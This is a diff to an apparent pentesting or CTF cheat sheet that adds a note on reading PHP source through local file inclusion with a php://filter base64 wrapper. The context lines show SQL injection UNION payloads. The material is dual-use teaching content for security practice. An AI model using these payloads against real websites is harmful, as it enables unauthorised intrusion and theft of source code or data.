@@ -11,6 +11,7 @@
    - [SUID](#suid)
 - [Web App](#webapp)
    - [SQL Injection](#sqlinj)
+   - [PHP] (#php)
    - [Flask Cookies Forge](#flaskcookie)
    - [XSS](#xss)
    - [Arbitrary File Upload](#AFU)
@@ -163,6 +164,18 @@ SELECT * from TABLE where USERNAME='' UNION SELECT 1 --AND PASSWORD='PASSWORD';
  ' UNION SELECT 1,2 # 
  ' UNION SELECT 1,2,3 # 
 ```
+
+<a name ="php"></a>
+### PHP
+
+#### Reading PHP source code via LFI
+
+If you found a site with URL like ?file=abc.php
+
+Basically, you can read its source code by ?file=php://filter/convert.base64-encode/abc.php.
+
+
+
 
 <a name ="flaskcookie"></a>
 ### Flask Cookie Forge
